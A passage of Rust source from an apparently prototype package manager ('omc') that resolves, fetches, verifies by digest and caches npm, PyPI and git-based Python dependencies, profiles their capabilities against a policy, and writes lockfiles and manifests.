        let (archive, sha256) = cache_python_vcs_checkout(
            project_dir,
            &checkout_dir,
            requirement,
            &lock.resolved_commit,
        )?;
        lock.archive = archive;
        lock.sha256 = sha256;
    }
    Ok((resolved, lock))
}

fn python_vcs_checkout_dir(project_dir: &Path, requirement: &PythonVcsRequirement) -> PathBuf {
    let extras = requirement
        .extras
        .iter()
        .cloned()
        .collect::<Vec<_>>()
        .join(",");
    let source = format!(
        "{}\0{}\0{}\0{}\0{}",
        requirement.name,
        requirement.url,
        requirement.reference.as_deref().unwrap_or_default(),
        requirement
            .subdirectory
            .as_deref()
            .map(|path| path.to_string_lossy())
            .unwrap_or_default(),
        extras
    );
    let digest = sha256_hex(source.as_bytes());
    project_dir
        .join(".omc")
        .join("python")
        .join("vcs")
        .join(safe_name(&requirement.name))
        .join(&digest[..16])
}

fn cache_python_vcs_checkout(
    project_dir: &Path,
    checkout_dir: &Path,
    requirement: &PythonVcsRequirement,
    resolved_commit: &str,
) -> Result<(String, String)> {
    let archive_path = python_vcs_archive_path(project_dir, requirement, resolved_commit);
    if !archive_path.exists() {
        write_python_vcs_archive(checkout_dir, &archive_path)?;
    }
    let bytes = fs::read(&archive_path)?;
    let sha256 = sha256_hex(&bytes);
    Ok((relative_path(project_dir, &archive_path), sha256))
}

fn python_vcs_archive_path(
    project_dir: &Path,
    requirement: &PythonVcsRequirement,
    resolved_commit: &str,
) -> PathBuf {
    let source = format!(
        "{}\0{}\0{}",
        requirement.name, requirement.url, resolved_commit
    );
    let source_hash = sha256_hex(source.as_bytes());
    project_dir
        .join(".omc")
        .join("cache")
        .join("python-vcs")
        .join(safe_name(&requirement.name))
        .join(&source_hash[..16])
        .join(format!("{resolved_commit}.tar.gz"))
}

fn write_python_vcs_archive(checkout_dir: &Path, archive_path: &Path) -> Result<()> {
    if let Some(parent) = archive_path.parent() {
        fs::create_dir_all(parent)?;
    }
    let file = fs::File::create(archive_path)?;
    let encoder = flate2::write::GzEncoder::new(file, flate2::Compression::default());
    let mut archive = tar::Builder::new(encoder);

    for entry in WalkDir::new(checkout_dir)
        .into_iter()
        .filter_entry(|entry| entry.file_name() != ".git")
    {
        let entry =
            entry.map_err(|error| OmcRegistryError::UnsupportedRequirement(error.to_string()))?;
        let path = entry.path();
        let relative = path
            .strip_prefix(checkout_dir)
            .map_err(|error| OmcRegistryError::UnsupportedRequirement(error.to_string()))?;
        if relative.as_os_str().is_empty() {
            continue;
        }
        if entry.file_type().is_dir() {
            archive.append_dir(relative, path)?;
        } else if entry.file_type().is_file() {
            archive.append_path_with_name(path, relative)?;
        }
    }

    archive.finish()?;
    Ok(())
}

fn restore_python_vcs_archive(
    project_dir: &Path,
    checkout_dir: &Path,
    dependency: &LockedPythonVcsDependency,
) -> Result<bool> {
    if dependency.archive.is_empty() {
        return Ok(false);
    }
    let archive_path = project_dir.join(&dependency.archive);
    if !archive_path.exists() {
        return Ok(false);
    }
    let bytes = fs::read(&archive_path)?;
    if !dependency.sha256.is_empty() {
        let actual = sha256_hex(&bytes);
        if !dependency.sha256.eq_ignore_ascii_case(&actual) {
            return Err(OmcRegistryError::DigestMismatch {
                name: dependency.name.clone(),
                expected: format!("sha256:{}", dependency.sha256),
                actual: format!("sha256:{actual}"),
            });
        }
    }

    remove_path_if_exists(checkout_dir)?;
    fs::create_dir_all(checkout_dir)?;
    let decoder = GzDecoder::new(Cursor::new(bytes));
    let mut archive = Archive::new(decoder);
    for entry in archive.entries()? {
        let mut entry = entry?;
        let relative = entry.path()?.into_owned();
        let output = checked_join(checkout_dir, &relative)?;
        if entry.header().entry_type().is_dir() {
            fs::create_dir_all(output)?;
            continue;
        }
        if !entry.header().entry_type().is_file() {
            return Err(OmcRegistryError::UnsupportedRequirement(format!(
                "python VCS cache archive contains unsupported entry type for `{}`",
                relative.display()
            )));
        }
        if let Some(parent) = output.parent() {
            fs::create_dir_all(parent)?;
        }
        entry.unpack(output)?;
    }
    Ok(true)
}

fn checkout_python_vcs_dependency(
    checkout_dir: &Path,
    requirement: &PythonVcsRequirement,
    reference: Option<&str>,
    locked: bool,
) -> Result<()> {
    if locked && checkout_dir.join(".git").is_dir() {
        if let Some(reference) = reference {
            if checkout_python_vcs_reference(checkout_dir, &requirement.name, reference).is_err() {
                let mut fetch = Command::new("git");
                fetch
                    .arg("-C")
                    .arg(checkout_dir)
                    .arg("fetch")
                    .arg("--quiet")
                    .arg("--all")
                    .arg("--tags");
                run_git_command(&mut fetch, &format!("fetch `{}`", requirement.name))?;
                checkout_python_vcs_reference(checkout_dir, &requirement.name, reference)?;
            }
        }
        return Ok(());
    }

    remove_path_if_exists(checkout_dir)?;
    fs::create_dir_all(checkout_dir.parent().ok_or_else(|| {
        OmcRegistryError::UnsupportedRequirement(format!(
            "VCS checkout path `{}` has no parent",
            checkout_dir.display()
        ))
    })?)?;

    let mut clone = Command::new("git");
    clone
        .arg("clone")
        .arg("--quiet")
        .arg(&requirement.url)
        .arg(checkout_dir);
    run_git_command(&mut clone, &format!("clone `{}`", requirement.url))?;

    if let Some(reference) = reference {
        checkout_python_vcs_reference(checkout_dir, &requirement.name, reference)?;
    }

    Ok(())
}

fn checkout_python_vcs_reference(checkout_dir: &Path, name: &str, reference: &str) -> Result<()> {
    let mut checkout = Command::new("git");
    checkout
        .arg("-C")
        .arg(checkout_dir)
        .arg("checkout")
        .arg("--quiet")
        .arg(reference);
    run_git_command(
        &mut checkout,
        &format!("checkout `{reference}` for `{name}`"),
    )?;
    Ok(())
}

fn git_rev_parse_head(checkout_dir: &Path, name: &str) -> Result<String> {
    let mut rev_parse = Command::new("git");
    rev_parse
        .arg("-C")
        .arg(checkout_dir)
        .arg("rev-parse")
        .arg("HEAD");
    let commit = run_git_command(&mut rev_parse, &format!("resolve HEAD for `{name}`"))?;
    if !is_git_commit_hash(&commit) {
        return Err(OmcRegistryError::UnsupportedRequirement(format!(
            "git resolve HEAD for `{name}` returned invalid commit `{commit}`"
        )));
    }
    Ok(commit)
}

fn is_git_commit_hash(value: &str) -> bool {
    value.len() == 40 && value.chars().all(|ch| ch.is_ascii_hexdigit())
}

fn locked_python_vcs_dependency(
    requirement: &PythonVcsRequirement,
    resolved_commit: String,
) -> LockedPythonVcsDependency {
    LockedPythonVcsDependency {
        name: requirement.name.clone(),
        url: requirement.url.clone(),
        reference: requirement.reference.clone(),
        resolved_commit,
        archive: String::new(),
        sha256: String::new(),
        subdirectory: python_vcs_subdirectory_string(requirement.subdirectory.as_deref()),
        extras: requirement.extras.iter().cloned().collect(),
    }
}

fn find_locked_python_vcs_dependency(
    locks: &[LockedPythonVcsDependency],
    requirement: &PythonVcsRequirement,
) -> Result<Option<LockedPythonVcsDependency>> {
    for lock in locks {
        if !python_vcs_lock_matches_requirement(lock, requirement) {
            continue;
        }
        if !is_git_commit_hash(&lock.resolved_commit) {
            return Err(OmcRegistryError::LockfileOutOfDate(format!(
                "pypi:{} @ git+{}",
                requirement.name, requirement.url
            )));
        }
        return Ok(Some(lock.clone()));
    }
    Ok(None)
}

fn python_vcs_lock_matches_requirement(
    lock: &LockedPythonVcsDependency,
    requirement: &PythonVcsRequirement,
) -> bool {
    let extras = lock
        .extras
        .iter()
        .map(|extra| normalize_pypi_extra(extra))
        .filter(|extra| !extra.is_empty())
        .collect::<BTreeSet<_>>();
    lock.name == requirement.name
        && lock.url == requirement.url
        && lock.reference == requirement.reference
        && lock.subdirectory == python_vcs_subdirectory_string(requirement.subdirectory.as_deref())
        && extras == requirement.extras
}

fn python_vcs_lock_key(
    lock: &LockedPythonVcsDependency,
) -> (String, String, Option<String>, Option<String>, Vec<String>) {
    let extras = lock
        .extras
        .iter()
        .map(|extra| normalize_pypi_extra(extra))
        .filter(|extra| !extra.is_empty())
        .collect::<BTreeSet<_>>()
        .into_iter()
        .collect::<Vec<_>>();
    (
        lock.name.clone(),
        lock.url.clone(),
        lock.reference.clone(),
        lock.subdirectory.clone(),
        extras,
    )
}

fn python_vcs_subdirectory_string(path: Option<&Path>) -> Option<String> {
    path.map(|path| path.to_string_lossy().replace('\\', "/"))
        .filter(|path| !path.is_empty())
}

fn run_git_command(command: &mut Command, description: &str) -> Result<String> {
    let output = command.output()?;
    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        return Err(OmcRegistryError::UnsupportedRequirement(format!(
            "git {description} failed: {}",
            stderr.trim()
        )));
    }
    Ok(String::from_utf8_lossy(&output.stdout).trim().to_owned())
}

fn read_python_source_requirements(
    package_dir: &Path,
    extras: &BTreeSet<String>,
) -> Result<ProjectRequirements> {
    let mut requirements = ProjectRequirements::default();

    let pyproject = package_dir.join("pyproject.toml");
    if pyproject.exists() {
        extend_project_requirements(
            &mut requirements,
            read_pyproject_requirements(&pyproject, extras, false)?,
        );
    }

    let setup_cfg = package_dir.join("setup.cfg");
    if setup_cfg.exists() {
        extend_project_requirements(
            &mut requirements,
            read_setup_cfg_requirements(&setup_cfg, extras)?,
        );
    }

    let setup_py = package_dir.join("setup.py");
    if setup_py.exists() {
        extend_project_requirements(
            &mut requirements,
            read_setup_py_requirements(&setup_py, extras)?,
        );
    }

    Ok(requirements)
}

fn locked_reachable_package_keys(
    lock: &OmcLock,
    specs: &[PackageSpec],
    options: &LinkOptions,
) -> Result<BTreeSet<String>> {
    let mut retained = BTreeSet::new();
    for spec in specs {
        let package =
            find_locked_package_for_spec(lock, spec, &options.constraints, &options.hashes)
                .ok_or_else(|| OmcRegistryError::LockfileOutOfDate(spec.requested()))?;
        collect_locked_dependencies(lock, package, &mut retained)?;
    }
    Ok(retained)
}

fn collect_locked_dependencies(
    lock: &OmcLock,
    package: &LockedPackage,
    retained: &mut BTreeSet<String>,
) -> Result<()> {
    if !retained.insert(locked_package_key(package)) {
        return Ok(());
    }

    for dependency in &package.dependencies {
        let spec = PackageSpec::parse(dependency)?;
        let dependency =
            find_locked_package_for_spec(lock, &spec, &BTreeMap::new(), &BTreeMap::new())
                .ok_or_else(|| OmcRegistryError::LockfileOutOfDate(spec.requested()))?;
        collect_locked_dependencies(lock, dependency, retained)?;
    }
    for dependency in &package.optional_dependencies {
        let spec = PackageSpec::parse(dependency)?;
        if let Some(dependency) =
            find_locked_package_for_spec(lock, &spec, &BTreeMap::new(), &BTreeMap::new())
        {
            collect_locked_dependencies(lock, dependency, retained)?;
        }
    }

    Ok(())
}

fn find_locked_package_for_spec<'a>(
    lock: &'a OmcLock,
    spec: &PackageSpec,
    constraints: &BTreeMap<String, String>,
    hashes: &BTreeMap<String, BTreeSet<String>>,
) -> Option<&'a LockedPackage> {
    lock.packages
        .iter()
        .filter(|package| package.ecosystem == spec.ecosystem)
        .filter(|package| locked_package_name_matches(package, spec))
        .filter(|package| {
            spec.direct_url
                .as_deref()
                .map(|url| package.source_url == url)
                .unwrap_or(true)
        })
        .filter(|package| locked_package_version_matches(package, spec, constraints))
        .filter(|package| {
            hashes
                .get(&spec.constraint_key())
                .map(|allowed| allowed.contains(&package.sha256))
                .unwrap_or(true)
        })
        .max_by(|left, right| match spec.ecosystem {
            Ecosystem::Npm => compare_npm_versions(&left.version, &right.version),
            Ecosystem::Pypi => compare_pypi_versions(&left.version, &right.version),
        })
}

fn locked_package_name_matches(package: &LockedPackage, spec: &PackageSpec) -> bool {
    match spec.ecosystem {
        Ecosystem::Npm => package.name == spec.name,
        Ecosystem::Pypi => normalize_pypi_name(&package.name) == spec.name,
    }
}

fn locked_package_version_matches(
    package: &LockedPackage,
    spec: &PackageSpec,
    constraints: &BTreeMap<String, String>,
) -> bool {
    match spec.ecosystem {
        Ecosystem::Npm => {
            let Ok((_, requirement)) = npm_registry_name_and_requirement(spec) else {
                return false;
            };
            constrained_npm_requirement(spec, requirement.as_deref(), constraints)
                .as_deref()
                .map(|requirement| npm_version_satisfies(&package.version, requirement))
                .unwrap_or(true)
        }
        Ecosystem::Pypi => constrained_pypi_requirement(spec, constraints)
            .as_deref()
            .map(|requirement| pypi_version_satisfies(&package.version, requirement))
            .unwrap_or(true),
    }
}

pub fn discover_project_specs(project_dir: impl AsRef<Path>) -> Result<Vec<PackageSpec>> {
    Ok(discover_project_requirements(project_dir)?.specs)
}

pub fn parse_pypi_direct_archive_reference(
    reference: &str,
    base_dir: impl AsRef<Path>,
) -> Result<Option<(PackageSpec, BTreeSet<String>)>> {
    if let Some(archive) = parse_pypi_local_archive_requirement(reference, base_dir.as_ref())? {
        return Ok(Some(archive));
    }
    parse_pypi_direct_archive_url_reference(reference)
}

pub fn parse_npm_direct_archive_reference(
    reference: &str,
    base_dir: impl AsRef<Path>,
) -> Result<Option<PackageSpec>> {
    let Some((source_url, local_path)) =
        npm_direct_cli_tarball_url(reference.trim(), base_dir.as_ref())?
    else {
        return Ok(None);
    };

    let name = if let Some(path) = local_path {
        npm_tarball_manifest_name(&path)?
    } else {
        NPM_DIRECT_TARBALL_PLACEHOLDER.to_owned()
    };

    Ok(Some(PackageSpec::with_direct_url(
        Ecosystem::Npm,
        name,
        source_url,
        BTreeSet::new(),
    )))
}

fn npm_direct_cli_tarball_url(
    requirement: &str,
    base_dir: &Path,
) -> Result<Option<(String, Option<PathBuf>)>> {
    if requirement.is_empty() {
        return Ok(None);
    }

    if let Some(url) = npm_direct_tarball_url(requirement, base_dir)? {
        let local_path = npm_file_url_path(&url)?;
        return Ok(Some((url, local_path)));
    }

    if !is_explicit_local_path(requirement) {
        return Ok(None);
    }

    let path = expand_local_path(requirement, base_dir);
    require_npm_tarball_path(path.to_string_lossy().as_ref())?;
    let url = reqwest::Url::from_file_path(&path).map_err(|_| {
        OmcRegistryError::UnsupportedSpec(format!(
            "direct npm tarball path `{}` could not be converted to a file URL",
            path.display()
        ))
    })?;
    Ok(Some((url.to_string(), Some(path))))
}

fn npm_file_url_path(url: &str) -> Result<Option<PathBuf>> {
    let url =
        reqwest::Url::parse(url).map_err(|_| OmcRegistryError::UnsupportedSpec(url.to_owned()))?;
    if url.scheme() != "file" {
        return Ok(None);
    }
    url.to_file_path().map(Some).map_err(|_| {
        OmcRegistryError::UnsupportedSpec(format!(
            "direct npm tarball URL `{url}` must use a valid file URL"
        ))
    })
}

fn npm_tarball_manifest_name(path: &Path) -> Result<String> {
    let bytes = fs::read(path)?;
    let manifest = npm_manifest_from_tgz(&bytes)?;
    manifest
        .name
        .filter(|name| !name.is_empty())
        .ok_or_else(|| {
            OmcRegistryError::UnsupportedSpec(format!(
                "direct npm tarball `{}` did not declare a package name",
                path.display()
            ))
        })
}

fn is_explicit_local_path(value: &str) -> bool {
    value == "."
        || value.starts_with("./")
        || value.starts_with("../")
        || value.starts_with('/')
        || value.starts_with("~/")
        || value.contains('\\')
}

fn expand_local_path(value: &str, base_dir: &Path) -> PathBuf {
    if let Some(rest) = value.strip_prefix("~/") {
        if let Some(home) = env::var_os("HOME") {
            return PathBuf::from(home).join(rest);
        }
    }
    let path = Path::new(value);
    if path.is_absolute() {
        path.to_path_buf()
    } else {
        base_dir.join(path)
    }
}

pub fn read_package_scripts(project_dir: impl AsRef<Path>) -> Result<BTreeMap<String, String>> {
    let project_dir = project_dir.as_ref();
    let mut scripts = BTreeMap::new();

    let pipfile = project_dir.join("Pipfile");
    if pipfile.exists() {
        scripts.extend(read_pipfile_scripts(&pipfile)?);
    }

    let package_json = project_dir.join("package.json");
    if package_json.exists() {
        let package =
            serde_json::from_str::<ProjectPackageJson>(&fs::read_to_string(package_json)?)?;
        scripts.extend(package.scripts);
    }

    Ok(scripts)
}

pub fn discover_project_requirements(project_dir: impl AsRef<Path>) -> Result<ProjectRequirements> {
    discover_project_requirements_with_extras(project_dir, &BTreeSet::new())
}

pub fn discover_project_requirements_with_extras(
    project_dir: impl AsRef<Path>,
    project_extras: &BTreeSet<String>,
) -> Result<ProjectRequirements> {
    discover_project_requirements_with_options(project_dir, project_extras, true)
}

fn resolve_package_graph(
    client: &Client,
    spec: &PackageSpec,
    options: &LinkOptions,
) -> Result<Vec<LinkReport>> {
    let mut reports = Vec::new();
    let mut seen = BTreeSet::new();
    add_package_graph_inner(client, spec, false, options, &mut seen, &mut reports)?;
    Ok(reports)
}

fn discover_project_requirements_with_options(
    project_dir: impl AsRef<Path>,
    project_extras: &BTreeSet<String>,
    include_dev_dependencies: bool,
) -> Result<ProjectRequirements> {
    let project_dir = project_dir.as_ref();
    let mut project = ProjectRequirements::default();

    let package_json = project_dir.join("package.json");
    if package_json.exists() {
        let requirements = read_package_json_requirements(&package_json, include_dev_dependencies)?;
        extend_project_requirements(&mut project, requirements);
    }

    for lockfile_name in ["package-lock.json", "npm-shrinkwrap.json"] {
        let lockfile = project_dir.join(lockfile_name);
        if lockfile.exists() {
            let lock_requirements = read_package_lock_requirements(&lockfile)?;
            extend_project_requirements(&mut project, lock_requirements);
        }
    }

    let yarn_lock = project_dir.join("yarn.lock");
    if yarn_lock.exists() {
        let lock_requirements = read_yarn_lock_requirements(&yarn_lock)?;
        extend_project_requirements(&mut project, lock_requirements);
    }

    let pnpm_lock = project_dir.join("pnpm-lock.yaml");
    if pnpm_lock.exists() {
        let lock_requirements = read_pnpm_lock_requirements(&pnpm_lock, include_dev_dependencies)?;
        extend_project_requirements(&mut project, lock_requirements);
    }

    let requirements_files = project_requirements_files(project_dir, include_dev_dependencies);
    if !requirements_files.is_empty() {
        let requirements = read_requirements_files(&requirements_files)?;
        extend_project_requirements(&mut project, requirements);
    }

    let pipfile_lock = project_dir.join("Pipfile.lock");
    if pipfile_lock.exists() {
        let requirements = read_pipfile_lock_requirements(&pipfile_lock, include_dev_dependencies)?;
        extend_project_requirements(&mut project, requirements);
    }

    let pipfile = project_dir.join("Pipfile");
    if pipfile.exists() && !pipfile_lock.exists() {
        let requirements = read_pipfile_requirements(&pipfile, include_dev_dependencies)?;
        extend_project_requirements(&mut project, requirements);
    }

    let uv_lock = project_dir.join("uv.lock");
    if uv_lock.exists() {
        let requirements = read_uv_lock_requirements(&uv_lock, include_dev_dependencies)?;
        extend_project_requirements(&mut project, requirements);
    }

    for pylock_name in ["pylock.omc.toml", "pylock.toml"] {
        let pylock = project_dir.join(pylock_name);
        if pylock.exists() {
            let requirements = read_pylock_requirements(&pylock)?;
            extend_project_requirements(&mut project, requirements);
            break;
        }
    }

    let pyproject_toml = project_dir.join("pyproject.toml");
    if pyproject_toml.exists() {
        let requirements =
            read_pyproject_requirements(&pyproject_toml, project_extras, include_dev_dependencies)?;
        extend_project_requirements(&mut project, requirements);
    }

    let setup_cfg = project_dir.join("setup.cfg");
    if setup_cfg.exists() {
        let requirements = read_setup_cfg_requirements(&setup_cfg, project_extras)?;
        extend_project_requirements(&mut project, requirements);
    }

    let setup_py = project_dir.join("setup.py");
    if setup_py.exists() {
        let requirements = read_setup_py_requirements(&setup_py, project_extras)?;
        extend_project_requirements(&mut project, requirements);
    }

    if root_python_project_has_metadata(project_dir)? {
        push_python_local_path(&mut project, project_dir.to_path_buf());
    }

    let poetry_lock = project_dir.join("poetry.lock");
    if poetry_lock.exists() {
        let requirements = read_poetry_lock_requirements(&poetry_lock)?;
        extend_project_requirements(&mut project, requirements);
    }

    Ok(project)
}

fn project_requirements_files(project_dir: &Path, include_dev_dependencies: bool) -> Vec<PathBuf> {
    let mut files = Vec::new();
    push_existing_requirement_file(&mut files, project_dir.join("requirements.txt"));
    push_existing_requirement_file(
        &mut files,
        project_dir.join("requirements").join("base.txt"),
    );

    if include_dev_dependencies {
        push_existing_requirement_file(&mut files, project_dir.join("requirements-dev.txt"));
        push_existing_requirement_file(&mut files, project_dir.join("dev-requirements.txt"));
        push_existing_requirement_file(
            &mut files,
            project_dir.join("requirements").join("dev.txt"),
        );
    }

    files
}

fn push_existing_requirement_file(files: &mut Vec<PathBuf>, path: PathBuf) {
    if path.exists() && !files.contains(&path) {
        files.push(path);
    }
}

fn add_package_graph_inner(
    client: &Client,
    spec: &PackageSpec,
    optional_dependency: bool,
    options: &LinkOptions,
    seen: &mut BTreeSet<String>,
    reports: &mut Vec<LinkReport>,
) -> Result<()> {
    let Some((report, dependencies)) =
        link_package_inner(client, spec, optional_dependency, options, false)?
    else {
        return Ok(());
    };
    let resolved_key = format!(
        "{}:{}@{}",
        report.locked.ecosystem,
        spec.name_with_extras(),
        report.locked.version
    );

    if !seen.insert(resolved_key) {
        return Ok(());
    }

    reports.push(report);

    for dependency in dependencies {
        add_package_graph_inner(
            client,
            &dependency.spec,
            dependency.optional,
            options,
            seen,
            reports,
        )?;
    }

    Ok(())
}

fn link_package_inner(
    client: &Client,
    spec: &PackageSpec,
    optional_dependency: bool,
    options: &LinkOptions,
    update_manifest: bool,
) -> Result<Option<(LinkReport, Vec<PackageDependency>)>> {
    let mut resolved = resolve_package(client, spec, options)?;
    if !resolved.platform_compatible {
        if optional_dependency {
            return Ok(None);
        }

        return Err(OmcRegistryError::UnsupportedSpec(format!(
            "{} is not compatible with this platform",
            spec.requested()
        )));
    }

    let archive_bytes = download_artifact(client, &resolved, &options.project_dir)?;
    let sha256 = sha256_hex(&archive_bytes);

    if let Some(expected) = &resolved.expected_sha256 {
        if !expected.eq_ignore_ascii_case(&sha256) {
            return Err(OmcRegistryError::DigestMismatch {
                name: resolved.name.clone(),
                expected: expected.clone(),
                actual: sha256,
            });
        }
    }
    if let Some(expected) = &resolved.expected_sha1 {
        let actual = sha1_hex(&archive_bytes);
        if !expected.eq_ignore_ascii_case(&actual) {
            return Err(OmcRegistryError::DigestMismatch {
                name: resolved.name.clone(),
                expected: format!("sha1:{expected}"),
                actual: format!("sha1:{actual}"),
            });
        }
    }
    if let Some(expected) = &resolved.expected_integrity {
        verify_npm_integrity(&resolved.name, expected, &archive_bytes)?;
    }
    if resolved.ecosystem == Ecosystem::Npm {
        if let Some(integrities) = options.npm_integrities.get(&spec.constraint_key()) {
            for integrity in integrities {
                verify_npm_integrity(&resolved.name, integrity, &archive_bytes)?;
            }
        }
    }
    if let Some(hashes) = options.hashes.get(&spec.constraint_key()) {
        if !hashes.contains(&sha256) {
            return Err(OmcRegistryError::DigestMismatch {
                name: resolved.name.clone(),
                expected: hashes.iter().cloned().collect::<Vec<_>>().join(","),
                actual: sha256,
            });
        }
    }

    let dependencies = if resolved.npm_direct_tarball {
        let manifest = npm_manifest_from_tgz(&archive_bytes)?;
        if manifest.version != resolved.version {
            return Err(OmcRegistryError::UnsupportedSpec(format!(
                "locked npm tarball version mismatch for `{}`: expected {}, got {}",
                resolved.name, resolved.version, manifest.version
            )));
        }
        resolved.platform_compatible = npm_manifest_platform_compatible(&manifest);
        resolved.npm_scripts = manifest.scripts.clone().unwrap_or_default();
        npm_manifest_runtime_dependencies(&manifest)
    } else if resolved.pypi_direct_wheel {
        pypi_wheel_dependencies(&archive_bytes, &spec.extras)?
    } else if is_python_sdist_filename(&resolved.filename) && resolved.dependencies.is_empty() {
        pypi_sdist_dependencies(&archive_bytes, &resolved.filename, &spec.extras)?
    } else {
        resolved.dependencies.clone()
    };
    if !resolved.platform_compatible {
        if optional_dependency {
            return Ok(None);
        }

        return Err(OmcRegistryError::UnsupportedSpec(format!(
            "{} is not compatible with this platform",
            spec.requested()
        )));
    }
    let archive_path = cache_archive(&options.project_dir, &resolved, &sha256, &archive_bytes)?;
    let profile = profile_archive(&resolved, &archive_bytes)?;
    let module = module_from_profile(&resolved, &profile.capabilities);
    let policy = options
        .allowed_capabilities
        .iter()
        .cloned()
        .fold(Policy::pure(), Policy::allow_capability);
    let verification = verify_module(&module, &policy);
    let verifier_findings = verification
        .err()
        .map(|error| {
            error
                .findings
                .into_iter()
                .map(render_verify_finding)
                .collect::<Vec<_>>()
        })
        .unwrap_or_default();
    let verdict = if verifier_findings.is_empty() {
        Verdict::Accepted
    } else {
        Verdict::Blocked
    };
    let behavior = if profile.capabilities.is_empty() {
        Behavior::Pure
    } else {
        Behavior::HostCapability
    };

    let mut artifact = OmcArtifact {
        schema: ARTIFACT_SCHEMA,
        package: ArtifactPackage {
            ecosystem: resolved.ecosystem,
            name: resolved.name.clone(),
            version: resolved.version.clone(),
        },
        source_url: resolved.source_url.clone(),
        source_sha256: sha256.clone(),
        compiler: "omc-prototype-source-profiler".to_owned(),
        microcode: module,
        behavior,
        verdict,
        grants: options
            .allowed_capabilities
            .iter()
            .map(ToString::to_string)
            .collect(),
        dependencies: dependencies
            .iter()
            .filter(|dependency| !dependency.optional)
            .map(|dependency| dependency.spec.requested())
            .collect(),
        optional_dependencies: dependencies
            .iter()
            .filter(|dependency| dependency.optional)
            .map(|dependency| dependency.spec.requested())
            .collect(),
        files_scanned: profile.files_scanned,
        capabilities: profile.capabilities,
        verifier_findings: verifier_findings.clone(),
        signature: None,
    };
    sign_artifact(&options.project_dir, &mut artifact)?;
    let artifact_path = write_artifact(&options.project_dir, &resolved, &artifact)?;

    let locked = LockedPackage {
        ecosystem: resolved.ecosystem,
        name: resolved.name.clone(),
        version: resolved.version.clone(),
        source_url: resolved.source_url.clone(),
        archive: relative_path(&options.project_dir, &archive_path),
        artifact: relative_path(&options.project_dir, &artifact_path),
        sha256,
        behavior,
        verdict,
        dependencies: artifact.dependencies.clone(),
        optional_dependencies: artifact.optional_dependencies.clone(),
        grants: artifact.grants.clone(),
        capabilities: artifact.capabilities.clone(),
        verifier_findings,
    };

    if locked.verdict == Verdict::Blocked && !options.record_blocked {
        return Err(OmcRegistryError::BlockedPackage {
            spec: spec.requested(),
        });
    }

    if update_manifest && options.save_manifest_dependency {
        let spec = manifest_spec_for_locked_root(spec, &locked);
        write_manifest_dependency(
            &options.project_dir,
            &spec,
            &resolved.version,
            options.save_dev_dependency,
        )?;
    }

    let lockfile = options.project_dir.join(LOCKFILE);
    let mut lock = read_lockfile(&lockfile)?;
    lock.upsert(locked.clone());
    fs::write(&lockfile, toml::to_string_pretty(&lock)?)?;

    let manifest_path = options.project_dir.join(MANIFEST);
    Ok(Some((
        LinkReport {
            locked,
            artifact,
            lockfile,
            manifest: manifest_path,
        },
        dependencies,
    )))
}

fn write_manifest_dependency(
    project_dir: &Path,
    spec: &PackageSpec,
    version: &str,
    dev_dependency: bool,
) -> Result<()> {
    let manifest_path = project_dir.join(MANIFEST);
    let mut manifest = read_manifest(&manifest_path)?;
    let requirement = spec
        .direct_url
        .as_ref()
        .cloned()
        .unwrap_or_else(|| version.to_owned());
    if dev_dependency {
        manifest.dependencies.remove(&spec.package_key());
        manifest
            .dev_dependencies
            .insert(spec.package_key(), requirement);
    } else {
        manifest.dev_dependencies.remove(&spec.package_key());
        manifest
            .dependencies
            .insert(spec.package_key(), requirement);
    }
    fs::write(&manifest_path, toml::to_string_pretty(&manifest)?)?;
    Ok(())
}

fn manifest_spec_for_locked_root(spec: &PackageSpec, locked: &LockedPackage) -> PackageSpec {
    if spec.direct_url.is_none() || spec.name == locked.name {
        return spec.clone();
    }
    let mut spec = spec.clone();
    spec.name = locked.name.clone();
    spec
}

pub fn read_lockfile(path: impl AsRef<Path>) -> Result<OmcLock> {
    let path = path.as_ref();
    if !path.exists() {
        return Ok(OmcLock::new());
    }
    Ok(toml::from_str(&fs::read_to_string(path)?)?)
}

pub fn read_manifest(path: impl AsRef<Path>) -> Result<OmcManifest> {
    let path = path.as_ref();
    if !path.exists() {
        return Ok(OmcManifest::new("omc-project"));
    }
    Ok(toml::from_str(&fs::read_to_string(path)?)?)
}

fn options_with_manifest_policy(options: &LinkOptions) -> Result<LinkOptions> {
    let mut options = options.clone();
    let manifest = read_manifest(options.project_dir.join(MANIFEST))?;
    apply_manifest_config(&manifest, &mut options)?;
    Ok(options)
}

fn apply_manifest_config(manifest: &OmcManifest, options: &mut LinkOptions) -> Result<()> {
    for grant in &manifest.policy.allow {
        options
            .allowed_capabilities
            .push(parse_capability_grant(grant)?);
    }
    let project_dir = options.project_dir.clone();
    for path in &manifest.npm_local_paths {
        options
            .npm_local_paths
            .push(resolve_manifest_path(&project_dir, path));
    }
    if options.include_dev_dependencies {
        for path in &manifest.npm_dev_local_paths {
            options
                .npm_local_paths
                .push(resolve_manifest_path(&project_dir, path));
        }
    }
    if options.pypi_index_url.is_none() {
        options.pypi_index_url = manifest
            .registries
            .pypi_index_url
            .as_deref()
            .and_then(normalize_pypi_simple_index_url);
    }
    options.pypi_extra_index_urls.extend(
        manifest
            .registries
            .pypi_extra_index_urls
            .iter()
            .filter_map(|index_url| normalize_pypi_simple_index_url(index_url)),
    );
    let manifest_or_explicit_index = options.pypi_index_url.is_some();
    if !manifest_or_explicit_index {
        apply_pip_config_files(&project_dir, options)?;
    }
    apply_pypi_environment_config(options, !manifest_or_explicit_index);
    dedupe_pypi_extra_index_urls(options);
    Ok(())
}

fn resolve_manifest_path(project_dir: &Path, path: &str) -> PathBuf {
    let path = PathBuf::from(path);
    if path.is_absolute() {
        path
    } else {
        project_dir.join(path)
    }
}

fn apply_pypi_environment_config(options: &mut LinkOptions, override_index: bool) {
    let index_url = env::var("PIP_INDEX_URL").ok();
    let extra_index_urls = env::var("PIP_EXTRA_INDEX_URL").ok();
    let find_links = env::var("PIP_FIND_LINKS").ok();
    let no_index = env_truthy("PIP_NO_INDEX");
    let project_dir = options.project_dir.clone();
    apply_pypi_environment_values(
        options,
        &project_dir,
        index_url.as_deref(),
        extra_index_urls.as_deref(),
        find_links.as_deref(),
        no_index,
        override_index,
    );
}

fn apply_pypi_environment_values(
    options: &mut LinkOptions,
    base_dir: &Path,
    index_url: Option<&str>,
    extra_index_urls: Option<&str>,
    find_links: Option<&str>,
    no_index: bool,
    override_index: bool,
) {
    if override_index || options.pypi_index_url.is_none() {
        if let Some(index_url) = index_url.and_then(normalize_pypi_simple_index_url) {
            options.pypi_index_url = Some(index_url);
        }
    }
    if let Some(extra_index_urls) = extra_index_urls {
        options.pypi_extra_index_urls.extend(
            pypi_index_url_values(extra_index_urls)
